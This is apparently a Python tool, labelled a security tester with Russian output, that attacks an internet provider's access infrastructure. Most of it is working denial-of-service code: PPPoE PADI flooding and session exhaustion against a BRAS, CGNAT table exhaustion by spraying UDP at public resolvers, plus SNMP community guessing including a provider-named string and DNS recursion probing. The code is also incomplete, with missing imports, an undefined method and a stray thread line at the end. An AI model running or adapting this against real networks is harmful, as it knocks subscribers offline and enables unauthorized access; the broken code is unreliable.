import threading
import time

from pysnmp.hlapi import *

class InfrastructureSecurityTester:
    def __init__(self, bras_mac, bras_ip, dns_servers, interface):
        self.bras_mac = bras_mac
        self.bras_ip = bras_ip
        self.dns_servers = dns_servers
        self.interface = interface
        self.results = {}
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        self.test_session_alive = True
        self.monitor_thread = None

    def padi_flood(self, duration=60):
        def flood_thread():
            session_ids = set()
            start_time = time.time()
            
            while not self.stop_event.is_set() and (time.time() - start_time < duration):
                src_mac = RandMAC()
                session_id = random.randint(1, 65535)
                session_ids.add(session_id)
                
                padi = Ether(dst="ff:ff:ff:ff:ff:ff", src=src_mac)/PPPoE(version=1, type=1, code=0x09, sessionid=0)/PPPoETag()
                sendp(padi, iface=self.interface, verbose=0)
                
                time.sleep(0.01)
                
                if len(session_ids) > 100:
                    self.check_bras_responses()
                    
                if not self.test_session_alive:
                    self.stop_event.set()
        
        try:
            print("[*] Запуск PADI флуда с мониторингом...")
            t = threading.Thread(target=flood_thread)
            t.daemon = True
            t.start()
            time.sleep(duration)
            with self.lock:
                self.results['padi_flood'] = True
        finally:
            self.stop_event.set()
            print("[+] PADI флуд остановлен.")

    def session_exhaustion(self, count=1000):
        successful_sessions = 0
        print(f"[*] Запуск исчерпания сессий (цель: {count})...")
        
        for _ in range(count):
            if self.stop_event.is_set():
                break
            client_mac = RandMAC()
            
            padi = Ether(dst="ff:ff:ff:ff:ff:ff", src=client_mac)/PPPoE(version=1, type=1, code=0x09, sessionid=0)/PPPoETag()
            sendp(padi, iface=self.interface, verbose=0)
            
            pado_filter = f"ether dst {client_mac} and pppoe and pppoe.code == 0x07"
            pado = sniff(iface=self.interface, filter=pado_filter, timeout=1.5, count=1)
            
            if pado:
                try:
                    sessionid = pado[0][PPPoE].sessionid
                    padr = Ether(dst=self.bras_mac, src=client_mac)/PPPoE(version=1, type=1, code=0x19, sessionid=sessionid)
                    sendp(padr, iface=self.interface, verbose=0)
                    
                    pads_filter = f"ether src {self.bras_mac} and ether dst {client_mac} and pppoe and pppoe.code == 0x68"
                    pads = sniff(iface=self.interface, filter=pads_filter, timeout=1.5, count=1)
                    
                    if pads:
                        successful_sessions += 1
                except Exception:
                    pass
            
            time.sleep(0.02)
        
        with self.lock:
            self.results['session_exhaustion'] = successful_sessions
        print(f"[+] Успешно захвачено сессий: {successful_sessions}/{count}")

    def cgnat_exhaustion(self, duration=60):
        def create_connections():
            unique_destinations = [
                "8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9", "208.67.222.222", "78.37.77.77"
            ]
            start_time = time.time()
            sockets_list = []
            
            while not self.stop_event.is_set() and (time.time() - start_time < duration):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    dst_ip = random.choice(unique_destinations)
                    dst_port = random.randint(1024, 65535)
                    
                    s.sendto(b"X" * 1024, (dst_ip, dst_port))
                    sockets_list.append(s)
                    
                    if len(sockets_list) > 5000:
                        old_s = sockets_list.pop(0)
                        old_s.close()
                except Exception:
                    pass
                
                time.sleep(0.001)
                
            for s in sockets_list:
                try:
                    s.close()
                except:
                    pass

        try:
            print("[*] Запуск исчерпания таблиц CGNAT...")
            t = threading.Thread(target=create_connections)
            t.daemon = True
            t.start()
            t.join(timeout=duration)
            with self.lock:
                self.results['cgnat_exhaustion'] = True
        finally:
            self.stop_event.set()
            print("[+] Тест CGNAT завершен.")

    def test_dns_amplification(self):
        vulnerable_servers = []
        print("[*] Сканирование DNS-инфраструктуры на открытую рекурсию/амплификацию...")
        for dns_ip in self.dns_servers:
            try:
                resolver = dns.resolver.Resolver()
                resolver.nameservers = [dns_ip]
                resolver.timeout = 2
                resolver.lifetime = 2
                
                answers = resolver.resolve('example.com', 'A')
                if answers:
                    vulnerable_servers.append(dns_ip)
            except Exception:
                pass
                
        with self.lock:
            self.results['dns_vulnerable_servers'] = vulnerable_servers
        print(f"[+] Уязвимые/открытые DNS-серверы: {vulnerable_servers}")

    def test_snmp_enumeration(self, communities=['public', 'private', 'rostrelecom']):
        found_communities = []
        print("[*] Проверка SNMP community строк на BRAS...")
        for comm in communities:
            try:
                errorIndication, errorStatus, errorIndex, varBinds = next(
                    getCmd(SnmpEngine(),
                           CommunityData(comm, mpModel=0),
                           UdpTransportTarget((self.bras_ip, 161), timeout=1, retries=1),
                           ContextData(),
                           ObjectType(ObjectIdentity('1.3.6.1.2.1.1.1.0')))
                )
                
                if not errorIndication and not errorStatus:
                    found_communities.append(comm)
            except Exception:
                pass
                
        with self.lock:
            self.results['snmp_exposed_communities'] = found_communities
        print(f"[+] Найденные SNMP community: {found_communities}")

        t_dns = threading.Thread(target=self.test_dns_amplification)
